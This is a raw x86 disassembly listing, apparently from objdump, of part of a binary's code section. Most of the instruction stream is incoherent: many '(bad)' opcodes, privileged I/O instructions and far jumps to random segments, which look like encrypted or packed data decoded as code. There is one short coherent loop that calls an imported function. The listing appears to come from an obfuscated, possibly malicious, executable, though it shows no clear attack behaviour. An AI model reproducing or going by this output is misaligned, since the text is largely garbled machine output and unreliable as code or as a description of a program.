  404895:	mov    edi,0x44193fa
  40489a:	sti    
  40489b:	les    esp,FWORD PTR [edx]
  40489d:	xlat   BYTE PTR ds:[ebx]
  40489e:	ds sub DWORD PTR ss:[eax],0x31
  4048a3:	or     al,0xdd
  4048a5:	scas   al,BYTE PTR es:[edi]
  4048a6:	imul   BYTE PTR [ecx+0xc5f5ef7]
  4048ac:	mov    esp,0x847a8679
  4048b1:	ds push edx
  4048b3:	bound  ebx,QWORD PTR [eax+0x1a]
  4048b6:	rcr    DWORD PTR [edi+0x79],cl
  4048b9:	cmp    BYTE PTR [esi-0x46374e33],dl
  4048bf:	pop    es
  4048c0:	push   ecx
  4048c1:	in     al,dx
  4048c2:	and    eax,esi
  4048c4:	std    
  4048c5:	and    dl,ch
  4048c7:	mov    ebx,DWORD PTR [eax-0x21e990a0]
  4048cd:	sub    eax,0xd4de2aa3
  4048d2:	setl   BYTE PTR [ebp-0x26]
  4048d6:	test   eax,0x71024188
  4048db:	lahf   
  4048dc:	test   BYTE PTR [ebp+0x3357a3ac],dl
  4048e2:	sti    
  4048e3:	push   ebp
  4048e4:	test   BYTE PTR [esi*8-0x2d270b1d],0xed
  4048ec:	jle    0x404961
  4048ee:	pop    edx
  4048ef:	and    eax,0x5b2d2a42
  4048f4:	xor    BYTE PTR [ebx+0x41],dh
  4048f7:	jp     0x4048e6
  4048f9:	(bad)  
  4048fa:	rcr    BYTE PTR [ebp-0x1e],1
  4048fd:	ins    DWORD PTR es:[edi],dx
  4048fe:	or     al,0x4
  404900:	inc    edi
  404901:	(bad)
  404904:	andps  xmm3,XMMWORD PTR [ebp+0x377c5ae4]
  40490b:	push   edi
  40490c:	das    
  40490d:	call   0xdd2d:0x62d772f2
  404914:	inc    esi
  404915:	scas   eax,DWORD PTR es:[edi]
  404916:	outs   dx,BYTE PTR ds:[esi]
  404917:	cmp    edi,ebx
  404919:	mov    dh,0xec
  40491b:	jle    0x40496e
  40491d:	add    DWORD PTR [ebp+0x27],edx
  404920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404921:	xchg   DWORD PTR [edi-0x5f60b7d4],edi
  404927:	(bad)  
  404928:	push   ss
  404929:	and    dl,BYTE PTR [ebp-0x23]
  40492c:	jle    0x40497e
  40492e:	aaa    
  40492f:	ret    0x1163
  404932:	cli    
  404933:	pop    ecx
  404934:	icebp  
  404935:	leave  
  404936:	(bad)  
  404937:	pop    ebp
  404938:	cmc    
  404939:	outs   dx,DWORD PTR ss:[esi]
  40493b:	xchg   ebp,eax
  40493c:	sbb    eax,0xdb769342
  404941:	data16 xadd BYTE PTR [ebx+0x0],al
  404946:	call   0xca59:0x92cb3e5c
  40494d:	aam    0xe0
  40494f:	adc    eax,0x8ef0667a
  404954:	fsub   st,st(7)
  404956:	mov    dh,0xe9
  404958:	ret    
  404959:	repz dec edx
  40495b:	push   ebp
  40495c:	mov    eax,0x8b5f721b
  404961:	cli    
  404962:	in     al,dx
  404963:	jl     0x404967
  404965:	jns    0x4049b1
  404967:	mov    eax,ds:0x3405c73d
  40496c:	(bad)  
  40496d:	cli    
  40496e:	jmp    DWORD PTR [esp+eax*8+0x114ae974]
  404975:	xor    esp,ebp
  404977:	xor    eax,esp
  404979:	xchg   esi,eax
  40497a:	add    edx,esp
  40497c:	sub    DWORD PTR [ebx],ebx
  40497e:	sub    bl,BYTE PTR [edx]
  404980:	cmp    al,0xc6
  404982:	stc    
  404983:	push   esi
  404984:	les    eax,FWORD PTR [edx+0x4e]
  404987:	cmc    
  404988:	jl     0x404975
  40498a:	dec    eax
  40498b:	xor    DWORD PTR [edi+0x69],ebp
  40498e:	jle    0x4049b6
  404990:	aam    0x2b
  404992:	leave  
  404993:	mov    ebp,0x79d35642
  404998:	or     dl,BYTE PTR [ebx]
  40499a:	mov    ah,0xb5
  40499c:	jl     0x404985
  40499e:	inc    eax
  40499f:	fcmovnbe st,st(5)
  4049a1:	scas   al,BYTE PTR es:[edi]
  4049a2:	jp     0x404a0e
  4049a4:	mov    DWORD PTR [ecx+eax*4-0x110eeb8d],eax
  4049ab:	jae    0x404a28
  4049ad:	ret    
  4049ae:	xor    edx,DWORD PTR [eax+eiz*1]
  4049b1:	enter  0x325d,0xa
  4049b5:	mov    al,0xde
  4049b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b8:	xchg   ecx,eax
  4049b9:	mov    al,ds:0xbd8e12c0
  4049be:	pop    edx
  4049bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c0:	les    edi,FWORD PTR ds:0x45c71a90
  4049c6:	xchg   esi,eax
  4049c7:	dec    edx
  4049c8:	xor    eax,0x89c3fd6d
  4049cd:	cmp    eax,0x6a08ed87
  4049d2:	(bad)  
  4049d3:	addr16 sub eax,0xf9697796
  4049d9:	xor    esi,eax
  4049db:	(bad)  
  4049dd:	jl     0x404a12
  4049df:	mov    ch,0xec
  4049e1:	dec    edx
  4049e2:	sub    cl,cl
  4049e4:	aad    0x64
  4049e6:	xor    DWORD PTR [edx],esi
  4049e8:	mov    ds:0x4df3c1e6,al
  4049ed:	and    al,0xa9
  4049ef:	fcom   QWORD PTR [edi]
  4049f1:	clc    
  4049f2:	call   0xc8ca:0x7b9572c9
  4049f9:	xor    dh,bl
  4049fb:	cmp    eax,0x3a
  4049fe:	rol    DWORD PTR [edx+esi*8+0x26],1
  404a02:	out    0xd6,al
  404a04:	push   esi
  404a05:	mov    ch,0x25
  404a07:	push   0x9433f64d
  404a0c:	pop    ss
  404a0d:	xor    al,0x8d
  404a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a10:	jnp    0x404a53
  404a12:	add    ch,BYTE PTR [ecx]
  404a14:	inc    ebp
  404a15:	je     0x404a4d
  404a17:	js     0x4049c1
  404a19:	popa   
  404a1a:	cs sahf 
  404a1c:	or     edx,ebp
  404a1e:	sti    
  404a1f:	outs   dx,DWORD PTR ds:[esi]
  404a20:	imul   edi,DWORD PTR [ebx],0xb0653d29
  404a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a27:	mov    eax,0x76c72781
  404a2c:	ss loopne 0x404a1c
  404a2f:	add    ch,BYTE PTR [eax]
  404a31:	fdivrp st(1),st
  404a33:	scas   eax,DWORD PTR es:[edi]
  404a34:	cmp    ch,bh
  404a36:	mov    dl,0x6
  404a38:	push   ds
  404a39:	xchg   BYTE PTR ds:0x41d38e1b,dl
  404a3f:	retf   
  404a40:	aam    0xda
  404a42:	aas    
  404a43:	in     al,0x79
  404a45:	push   ebp
  404a46:	jg     0x404ac6
  404a48:	push   edi
  404a49:	js     0x404a9b
  404a4b:	push   edx
  404a4c:	nop
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42a859,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a859
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a859,esi
  404a69:	cmp    DWORD PTR ds:0x42a859,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a859,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a859
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a859,esi
  404ab7:	cmp    DWORD PTR ds:0x42a859,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a81d
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	xchg   ecx,eax
  404ae3:	jnp    0x404b58
  404ae5:	xor    eax,DWORD PTR [esi+0x2e]
  404ae8:	js     0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404aa8
  404aef:	cmp    eax,DWORD PTR [ebx-0x79]
  404af2:	push   es
  404af3:	aad    0x7f
  404af5:	dec    ecx
  404af6:	fld    st(4)
  404af8:	jl     0x404ae0
  404afa:	inc    edi
  404afb:	sub    edx,DWORD PTR [bx]
  404afe:	jmp    0x404ab5
  404b00:	int    0xe3
  404b02:	das    
  404b03:	mov    bl,0x12
  404b05:	(bad)  
  404b06:	pusha  
  404b07:	sub    DWORD PTR [ebx],edi
  404b09:	add    eax,0xeb8a6654
  404b0e:	repnz inc esp
  404b10:	xlat   BYTE PTR ds:[ebx]
  404b11:	jge    0x404b21
  404b13:	mov    dl,0x9f
  404b15:	rcl    BYTE PTR [eax+0x2e4a7621],cl
  404b1b:	in     eax,0x97
  404b1d:	xchg   ebx,ecx
  404b1f:	inc    ebp
  404b20:	xchg   ebp,eax
  404b21:	fld    DWORD PTR [eax]
  404b23:	mov    esp,0xd53d564f
  404b28:	ja     0x404af5
  404b2a:	outs   dx,BYTE PTR ds:[esi]
  404b2b:	mov    dh,0x99
  404b2d:	ss scas al,BYTE PTR es:[edi]
  404b2f:	cmc    
  404b30:	jnp    0x404b1a
  404b32:	retf   
  404b33:	jne    0x404b4d
  404b35:	dec    ebp
  404b36:	lahf   
  404b37:	mov    ebp,0x269cf0fc
  404b3c:	test   eax,esp
  404b3e:	inc    eax
  404b3f:	ret    
  404b40:	(bad)  
  404b41:	mov    ch,0x8d
  404b43:	iret   
  404b44:	fwait
  404b45:	clc    
  404b46:	(bad)  
  404b48:	stos   DWORD PTR es:[edi],eax
  404b49:	int    0xb
  404b4b:	jmp    0x404ad1
  404b4d:	cmp    esp,edx
  404b4f:	int3   
  404b50:	pop    ecx
  404b51:	loopne 0x404b8e
  404b53:	jmp    0x323f:0x8aad2529
  404b5a:	pop    ecx
  404b5b:	sbb    ch,cl
  404b5d:	sbb    DWORD PTR [edx+eax*2+0x6ee67965],ebp
  404b64:	paddd  mm7,mm3
  404b67:	jae    0x404aea
  404b69:	in     eax,dx
  404b6a:	(bad)  
  404b6b:	adc    BYTE PTR [ebx],cl
  404b6d:	fdiv   QWORD PTR [ecx-0x4a]
  404b70:	retf   
  404b71:	inc    edx
  404b72:	rol    BYTE PTR [eax],0x4
  404b75:	sub    eax,0xf65ca575
  404b7a:	xchg   ecx,eax
  404b7b:	pop    ebp
  404b7c:	and    bh,BYTE PTR [ebx]
  404b7e:	jo     0x404bb9
  404b80:	test   eax,0x730d903a
  404b85:	cmp    eax,DWORD PTR [edx]
  404b87:	add    edx,DWORD PTR [edx]
  404b89:	shl    ecx,cl
  404b8b:	lea    edx,[esi-0x29]
  404b8e:	rol    BYTE PTR [ecx+0x2e713137],cl
  404b94:	ds dec eax
  404b96:	xlat   BYTE PTR ds:[ebx]
  404b97:	aad    0x56
  404b99:	les    ebx,FWORD PTR [edi-0x24fb9fc1]
  404b9f:	or     esp,DWORD PTR [edx+0x45]
  404ba2:	nop
  404ba3:	mov    al,ds:0xc9393665
  404ba8:	nop
  404ba9:	jg     0x404b2f
  404bab:	jae    0x404b8e
  404bad:	fsub   DWORD PTR [edx+edx*4+0x2a]
  404bb1:	lock push ebx
  404bb3:	cmp    DWORD PTR [esi+0x3a],ebp
  404bb6:	aas    
  404bb7:	sub    edx,edi
  404bb9:	(bad)  
  404bbb:	out    dx,eax
  404bbc:	inc    esi
  404bbd:	xchg   esp,eax
  404bbe:	arpl   di,cx
  404bc0:	mov    esi,0x75185719
  404bc5:	sbb    cl,BYTE PTR [ebp-0x18]
  404bc8:	bound  ebx,QWORD PTR [esi-0x62b503ed]
  404bce:	imul   ebx,DWORD PTR [ebx+0x2c],0x25396f5
  404bd5:	push   ss
  404bd6:	stos   DWORD PTR es:[edi],eax
  404bd7:	pop    ds
  404bd8:	sbb    DWORD PTR [eax-0x33],0x46
  404bdc:	sbb    ebx,0x11783b65
  404be2:	popa   
  404be3:	xchg   esi,eax
  404be4:	aaa    
  404be5:	sbb    BYTE PTR [edx-0x66],cl
  404be8:	add    edi,esi
  404bea:	(bad)  [edx]
  404bec:	push   ecx
  404bed:	call   0xe5aed04c
  404bf2:	sbb    al,0xbe
  404bf4:	pop    esi
  404bf5:	sub    ecx,DWORD PTR [ebp+0x1630d1ee]
  404bfb:	sar    DWORD PTR [edx],1
  404bfd:	inc    eax
  404bfe:	mov    dl,BYTE PTR [eax-0x64]
  404c01:	lods   al,BYTE PTR ds:[esi]
  404c02:	push   es
  404c03:	add    ch,0x65
  404c06:	mov    bh,0xf1
  404c08:	and    DWORD PTR [eax+eiz*4],esp
  404c0b:	cmp    al,0x48
  404c0d:	shl    DWORD PTR [esi-0x5c30bc5e],1
  404c13:	lds    ebp,FWORD PTR [ecx+0x7c]
  404c16:	jmp    0xd8ae682e
  404c1b:	cmp    eax,0x987d3afc
  404c20:	int3   
  404c21:	jle    0x404c82
  404c23:	xor    al,0x4e
  404c25:	cmp    ebp,esp
  404c27:	(bad)  [ebx-0x1a]
  404c2a:	dec    eax
  404c2b:	ficomp WORD PTR [ebp-0x4a0358a0]
  404c31:	js     0x404c62
  404c33:	shr    DWORD PTR [ebx-0x15],cl
  404c36:	fld    DWORD PTR [esi+0x14]
  404c39:	fdiv   DWORD PTR [ecx-0x4d]
  404c3c:	mov    ch,0x3c
  404c3e:	stc    
  404c3f:	jb     0x404c60
  404c41:	mov    eax,ds:0xbdb55330
  404c46:	out    dx,eax
  404c47:	js     0x404cab
  404c49:	call   0xa34c267c
  404c4e:	not    DWORD PTR [eax+0x7a]
  404c51:	sar    BYTE PTR [edx+0x6e],0x26
  404c55:	xchg   edx,eax
  404c56:	inc    ebx
  404c57:	and    BYTE PTR [edx],al
  404c59:	mov    al,0x78
  404c5b:	out    dx,eax
  404c5c:	xchg   ebp,eax
  404c5d:	mov    gs:0x5bb38f2,al
  404c63:	mov    ah,0xf2
  404c65:	mov    ds:0x95dffde0,eax
  404c6a:	shr    DWORD PTR [esi-0xee3b02f],cl
  404c70:	fistp  WORD PTR [edx+0x42]
  404c73:	inc    edx
  404c74:	adc    eax,0xb1506343
  404c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c7a:	pop    edx
  404c7b:	scas   eax,DWORD PTR es:[edi]
  404c7c:	sbb    ebx,DWORD PTR [edi+0x18c55609]
  404c82:	fimul  WORD PTR [edx-0x7b]
  404c85:	(bad)  
  404c86:	push   0xffffff81
  404c88:	xchg   BYTE PTR [ebp+0xa371d6e],al
  404c8e:	sbb    al,0x73
  404c90:	push   ecx
  404c91:	inc    ebx
  404c92:	ins    BYTE PTR es:[edi],dx
  404c93:	sbb    ch,al
  404c95:	fst    st(5)
  404c97:	(bad)  
  404c98:	add    BYTE PTR [edi-0x3c],dh
  404c9b:	pushf  
  404c9c:	mov    eax,ds:0xf339e29d
  404ca1:	ins    DWORD PTR es:[edi],dx
  404ca2:	sub    al,0x53
  404ca4:	inc    esp
  404ca5:	pop    eax
  404ca6:	clc    
  404ca7:	test   BYTE PTR [ebx-0x1a5b8138],dh
  404cad:	jp     0x404cbf
  404caf:	rcr    edx,1
  404cb1:	sbb    ebp,DWORD PTR [eax]
  404cb3:	lds    ebx,FWORD PTR [edx]
  404cb5:	fwait
  404cb6:	xor    al,0xda
  404cb8:	sub    cl,BYTE PTR [esp+ebp*2-0x9]
  404cbc:	cmc    
  404cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cbe:	mov    gs,ecx
  404cc0:	inc    ebx
  404cc1:	adc    bh,BYTE PTR [esp+edi*1+0xd]
  404cc5:	jmp    0x303b5984
  404cca:	xchg   ebp,eax
  404ccb:	jbe    0x404c8d
  404ccd:	shl    BYTE PTR [edx-0x4b],1
  404cd0:	stos   DWORD PTR es:[edi],eax
  404cd1:	sub    edx,eax
  404cd3:	rol    DWORD PTR [edi-0x62d9b614],cl
  404cd9:	loop   0x404cde
  404cdb:	lds    edi,FWORD PTR [ecx]
  404cdd:	jecxz  0x404cb7
  404cdf:	shl    DWORD PTR [ebx+0x74],0xf0
  404ce3:	dec    edi
  404ce4:	sbb    eax,0x2fc67e9e
  404ce9:	outs   dx,DWORD PTR ds:[esi]
  404cea:	pop    eax
  404ceb:	repnz pop ebx
  404ced:	xor    esp,DWORD PTR [ebx]
  404cef:	jmp    0x404d16
  404cf1:	or     dh,cl
  404cf3:	push   0xffffffa5
  404cf5:	lahf   
  404cf6:	sub    BYTE PTR ds:0x82b3e888,0x9c
  404cfd:	lahf   
  404cfe:	call   0x75c:0x71fa84e8
  404d05:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404d07:	jmp    0x1f1f5807
  404d0c:	push   ds
  404d0d:	sti    
  404d0e:	int    0x3e
  404d10:	sbb    DWORD PTR [eax+0x2],0x66a2bdf
  404d17:	cld    
  404d18:	mov    al,fs:0x6128be10
  404d1e:	dec    esp
  404d1f:	and    BYTE PTR [eax],dl
  404d21:	cs (bad) 
  404d23:	push   esi
  404d24:	xchg   ebx,eax
  404d25:	cld    
  404d26:	or     al,0x1d
  404d28:	popf   
  404d29:	cmp    al,0xd0
  404d2b:	imul   edi,DWORD PTR [esi+edi*1],0x40
  404d2f:	pop    esp
  404d30:	xor    al,0x94
  404d32:	lock inc esi
  404d34:	jg     0x404ce8
  404d36:	xchg   BYTE PTR [eax+0x4b],bh
  404d39:	pop    edx
  404d3a:	or     BYTE PTR [edx-0x1b5f0e64],ah
  404d40:	(bad)  
  404d41:	and    al,ch
  404d43:	psrad  mm4,mm4
  404d46:	add    ebp,esi
  404d48:	loope  0x404d90
  404d4a:	and    DWORD PTR [edx+0x4f16e1c3],edx
  404d50:	adc    al,0x7b
  404d52:	mov    esp,DWORD PTR [edx]
  404d54:	test   eax,0x6e94e518
  404d59:	aam    0x5
  404d5b:	push   0xe4d7d52e
  404d60:	fcomp  QWORD PTR [ecx+ebp*1+0x2028f703]
  404d67:	and    DWORD PTR [edi],ebx
  404d69:	setle  BYTE PTR ss:[ecx+0x338be5bb]
  404d71:	xor    DWORD PTR [edi-0x58c1de7],ecx
  404d77:	mov    BYTE PTR [ebx],bl
  404d79:	mov    ch,0xf6
  404d7b:	mov    dh,BYTE PTR [ecx+0x5dc1c584]
  404d81:	scas   eax,DWORD PTR es:[edi]
  404d82:	or     eax,0x71fada60
  404d87:	(bad)  
  404d88:	jmp    0x404dc3
  404d8a:	pop    edx
  404d8b:	adc    al,0xa7
  404d8d:	and    BYTE PTR [edi-0x20b74c71],dl
  404d93:	(bad)  
  404d94:	shr    BYTE PTR [eax+0x55],cl
  404d97:	xlat   BYTE PTR ds:[ebx]
  404d98:	adc    al,0xd6
  404d9a:	and    ch,ch
  404d9c:	lock scas eax,DWORD PTR es:[edi]
  404d9e:	xor    al,0x71
  404da0:	jo     0x404d8a
  404da2:	ins    BYTE PTR es:[edi],dx
  404da3:	rcl    ch,cl
  404da5:	add    ch,cl
  404da7:	dec    esi
  404da8:	aad    0x62
  404daa:	dec    dx
  404dac:	xor    dl,cl
  404dae:	clc    
  404daf:	cmp    ah,ah
  404db1:	fisubr WORD PTR [edx]
  404db3:	push   edx
  404db4:	xor    dl,BYTE PTR [edx+edi*4+0x53]
  404db8:	sahf   
  404db9:	rcl    DWORD PTR [ecx+0x7243079a],cl
  404dbf:	arpl   WORD PTR [edi+0x57],di
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	shr    BYTE PTR [edi+0x339bb9d0],1
  404dee:	js     0x404e68
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404d7a
  404df5:	adc    eax,0x429ed9d
  404dfa:	push   0xffffff97
  404dfc:	mov    al,0xdc
  404dfe:	sub    BYTE PTR [eax-0x5e],ah
  404e01:	add    ch,BYTE PTR [ebx-0x16]
  404e04:	sbb    BYTE PTR [eax-0x3f],ch
  404e07:	aaa    
  404e08:	push   edi
  404e09:	pop    es
  404e0a:	ret    0x74c
  404e0d:	xchg   edx,eax
  404e0e:	ins    DWORD PTR es:[edi],dx
  404e0f:	xchg   BYTE PTR [esi],bh
  404e11:	xlat   BYTE PTR ds:[ebx]
  404e12:	push   esp
  404e13:	(bad)  
  404e14:	jmp    0x404ddb
  404e16:	push   ss
  404e17:	sbb    al,0xb4
  404e19:	sahf   
  404e1a:	data16 (bad) 
  404e1c:	test   al,0x5b
  404e1e:	add    DWORD PTR [esi+0x1e1191fc],eax
  404e24:	xor    edi,ecx
  404e26:	test   DWORD PTR [eax],eax
  404e28:	dec    esi
  404e29:	bound  esi,QWORD PTR ds:0x952d2e99
  404e2f:	and    BYTE PTR [ecx],ch
  404e31:	cmp    al,0x19
  404e33:	or     BYTE PTR ds:0x501ca80c,cl
  404e39:	loope  0x404e6b
  404e3b:	mov    DWORD PTR [edi+0x372ebbb6],ecx
  404e41:	xchg   edx,eax
  404e42:	cdq    
  404e43:	mov    dh,0xd3
  404e45:	out    dx,al
  404e46:	ficomp DWORD PTR [ecx]
  404e48:	push   esp
  404e49:	stos   DWORD PTR es:[edi],eax
  404e4a:	cdq    
  404e4b:	popa   
  404e4c:	pop    ecx
  404e4d:	cmc    
  404e4e:	fcmove st,st(4)
  404e50:	push   edx
  404e51:	test   al,0xed
  404e53:	pop    es
  404e54:	nop
  404e55:	pop    ss
  404e56:	push   cs
  404e57:	inc    esp
  404e58:	inc    ebx
  404e59:	rol    ch,0xdd
  404e5c:	les    eax,FWORD PTR [ecx]
  404e5e:	inc    edx
  404e5f:	or     al,0x12
  404e61:	push   esi
  404e62:	sbb    esi,DWORD PTR gs:[edx]
  404e65:	aas    
  404e66:	into   
  404e67:	or     DWORD PTR [edi+esi*8],ecx
  404e6a:	inc    edx
  404e6b:	shl    DWORD PTR [ebp+0x69],0xda
  404e6f:	mov    ebx,gs
  404e71:	and    eax,0xdcf6d39f
  404e76:	add    al,0x46
  404e78:	mov    ah,0x1b
  404e7a:	pushf  
  404e7b:	sar    esp,1
  404e7d:	xor    DWORD PTR [eax+ecx*2-0x57c45955],ecx
  404e84:	add    al,0x83
  404e86:	jne    0x404eb4
  404e88:	loopne 0x404ef2
  404e8a:	in     al,0xb1
  404e8c:	dec    ecx
  404e8d:	jne    0x404efd
  404e8f:	jmp    0x3cc6:0x2a599df9
  404e96:	mov    dh,0x6b
  404e98:	in     eax,0xaa
  404e9a:	das    
  404e9b:	inc    ebx
  404e9c:	data16 add al,0x6
  404e9f:	mov    esp,ss
  404ea1:	fs fst st(5)
  404ea4:	jp     0x404e2f
  404ea6:	sub    edi,eax
  404ea8:	sbb    DWORD PTR [esi],0x58dbf51e
  404eae:	xchg   esi,eax
  404eaf:	mov    dh,0x1f
  404eb1:	fiadd  WORD PTR ds:0xa46574e6
  404eb7:	push   ds
  404eb8:	push   edx
  404eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eba:	and    DWORD PTR [edx+ebx*4],edi
  404ebd:	push   eax
  404ebf:	fisub  WORD PTR [edx+0x118a6b1c]
  404ec5:	inc    edx
  404ec6:	jno    0x404eac
  404ec8:	sub    al,0x7c
  404eca:	mov    ebp,0x70e2ebfa
  404ecf:	xor    al,0xe2
  404ed1:	stos   BYTE PTR es:[edi],al
  404ed2:	sti    
  404ed3:	sar    DWORD PTR [ebx-0x78],cl
  404ed6:	mov    al,ds:0xe39c515
  404edb:	or     BYTE PTR [ebp-0xd],dl
  404ede:	dec    BYTE PTR [ecx]
  404ee0:	pusha  
  404ee1:	pusha  
  404ee2:	mov    cs,WORD PTR [ecx+esi*4]
  404ee5:	jmp    0x5679617d
  404eea:	jl     0x404e83
  404eec:	jmp    0x8099:0x54a3de20
  404ef3:	lldt   WORD PTR [ebp+0x3f86164c]
  404efa:	push   0x5eaa85d8
  404eff:	pop    edi
  404f00:	repnz pop esi
  404f02:	out    0x17,al
  404f04:	aad    0x2e
  404f06:	or     al,0x5f
  404f08:	in     eax,0xdc
  404f0a:	mov    bh,0x23
  404f0c:	imul   ebp,ebx,0x58e12f65
  404f12:	(bad)  
  404f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f14:	or     eax,0x86ee18eb
  404f19:	cwde   
  404f1a:	hlt    
  404f1b:	or     DWORD PTR [edi+0x22],ebp
  404f1e:	push   ebp
  404f1f:	jge    0x404eca
  404f21:	in     al,0x2b
  404f23:	mov    esi,0xfeb5046a
  404f28:	js     0x404eff
  404f2a:	sbb    cl,BYTE PTR [esi-0x49]
  404f2d:	ins    BYTE PTR es:[edi],dx
  404f2e:	fimul  WORD PTR [edx-0x16a1cdb3]
  404f34:	sub    esi,edx
  404f36:	mov    ah,0x7e
  404f38:	nop
  404f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3a:	(bad)  
  404f3b:	jns    0x404f85
  404f3d:	repnz loop 0x404eef
  404f40:	pusha  
  404f41:	jbe    0x404f7d
  404f43:	leave  
  404f44:	loop   0x404f5f
  404f46:	pop    esp
  404f47:	jg     0x404ed9
  404f49:	mov    al,ds:0xace440e7
  404f4e:	add    ebp,DWORD PTR [esi]
  404f50:	shr    DWORD PTR [esi+eax*8+0x747b5a6e],0x4e
  404f58:	sbb    BYTE PTR [ecx],0x60
  404f5b:	pop    eax
  404f5c:	mov    ds:0xee73d7d5,eax
  404f61:	dec    ecx
  404f62:	retf   
  404f63:	and    al,BYTE PTR [eax]
  404f65:	jl     0x404fba
  404f67:	lods   eax,DWORD PTR ds:[esi]
  404f68:	inc    ebp
  404f69:	mov    BYTE PTR [edi+0x232556c2],dl
  404f6f:	rcl    BYTE PTR [edi-0x6a],cl
  404f72:	stc    
  404f73:	aaa    
  404f74:	pop    edx
  404f75:	shl    bl,1
  404f77:	iret   
  404f78:	test   BYTE PTR [edx+0x65],cl
  404f7b:	jmp    FWORD PTR [ecx+0x29]
  404f7e:	dec    ebx
  404f7f:	icebp  
  404f80:	inc    edx
  404f81:	cmc    
  404f82:	mov    bl,0x74
  404f84:	call   0xd0b8:0xb7dc0e5
  404f8b:	add    eax,0xf2a655c1
  404f90:	fsub   DWORD PTR [ebp-0xe]
  404f93:	push   ebp
  404f94:	ret    0x5518
  404f97:	in     al,0x1a
  404f99:	or     eax,0xbbde41bc
  404f9e:	out    0xcf,eax
  404fa0:	or     dh,BYTE PTR [ebx-0x6e]
  404fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa4:	das    
  404fa5:	push   edx
  404fa6:	push   0x8f4a6490
  404fab:	imul   edi,DWORD PTR [edi-0x19],0xffffff8e
  404faf:	loopne 0x40500c
  404fb1:	and    al,0x9e
  404fb3:	repz adc al,dl
  404fb6:	or     eax,0xf5829721
  404fbb:	sar    cl,cl
  404fbd:	cld    
  404fbe:	mov    eax,ds:0x6271a835
  404fc3:	repz jmp 0x404fe5
  404fc6:	push   ds
  404fc7:	je     0x404f85
  404fc9:	xor    DWORD PTR [edi-0x5148f6aa],0x2b
  404fd0:	sub    DWORD PTR ds:[edi+0x7d],esi
  404fd4:	xor    cl,BYTE PTR [edx+0x1]
  404fd7:	add    BYTE PTR [edx+0x18],dl
  404fda:	clc    
  404fdb:	aas    
  404fdc:	out    dx,eax
  404fdd:	sub    esi,DWORD PTR [eax-0x42c3ece2]
  404fe3:	mov    dl,0xde
  404fe5:	xor    DWORD PTR [eax-0x79],ecx
  404fe8:	or     DWORD PTR [edi+0x42],esi
  404feb:	aaa    
  404fec:	pop    ebx
  404fed:	cmp    eax,0xffa3ab68
  404ff2:	add    eax,0x6a75135
  404ff7:	and    al,ah
  404ff9:	in     al,dx
  404ffa:	jne    0x40507b
  404ffc:	and    BYTE PTR [edx+0x40],ah
  404fff:	int3   
  405000:	push   es
  405001:	and    ebx,DWORD PTR [ecx]
  405003:	mov    bh,BYTE PTR [ecx+0x70]
  405006:	dec    edi
  405007:	hlt    
  405008:	jno    0x405036
  40500a:	sbb    DWORD PTR [ecx-0x42],ebx
  40500d:	int    0xe2
  40500f:	or     BYTE PTR [edi+0x169d32b7],0x89
  405016:	ins    BYTE PTR es:[edi],dx
  405017:	ss ins DWORD PTR es:[edi],dx
  405019:	pop    es
  40501a:	lods   al,BYTE PTR ds:[esi]
  40501b:	mov    eax,0x1fdfbf63
  405020:	into   
  405021:	repnz xor ch,ch
  405024:	add    ecx,ecx
  405026:	xor    dl,bl
  405028:	scas   al,BYTE PTR es:[edi]
  405029:	push   esi
  40502a:	enter  0x3267,0x89
  40502e:	cmp    al,0x76
  405030:	outs   dx,DWORD PTR ds:[esi]
  405031:	iret   
  405032:	xchg   DWORD PTR [ebp-0x29],ebp
  405035:	cdq    
  405036:	test   al,0xd4
  405038:	sbb    esp,DWORD PTR [ebp+ecx*4+0x33]
  40503c:	mov    ?,WORD PTR [ecx-0x6a3bb6be]
  405042:	mov    BYTE PTR [esi+edx*1-0x5a809a2e],ah
  405049:	in     eax,0xfa
  40504b:	std    
  40504c:	iret   
  40504d:	ss mov ah,0x7f
  405050:	repnz cmp edi,eax
  405053:	mov    ss,WORD PTR [edx+0x29152b40]
  405059:	or     dh,BYTE PTR [esp+ecx*1-0x1d]
  40505d:	inc    esi
